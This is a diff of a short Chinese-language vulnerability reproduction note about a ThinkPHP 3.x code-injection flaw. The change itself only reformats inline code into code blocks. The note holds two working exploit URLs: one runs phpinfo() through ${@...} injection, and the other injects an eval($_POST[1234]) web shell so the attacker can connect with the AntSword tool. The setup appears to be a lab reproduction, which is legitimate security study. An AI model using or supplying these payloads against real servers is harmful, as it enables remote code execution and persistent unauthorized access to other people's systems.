@@ -23,13 +23,25 @@ ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏�
 
 1.使用如下POC可查看phpinfo信息
 
-`http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D`
+```
+http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D
+```
+
+
 
 ![](http://cdn.laohuan.art/2020-06-13_15-57-09.png)
 
+
+
+
+
 2.使用蚁剑连接
 
-`http://IP:8080/index.php?s=/index/index/name/${@print%28eval%28$_POST[1234]%29%29}`
+```
+http://IP:8080/index.php?s=/index/index/name/${@print%28eval%28$_POST[1234]%29%29}
+```
+
+
 
 ![](http://cdn.laohuan.art/2020-06-13_16-15-37.png)
 
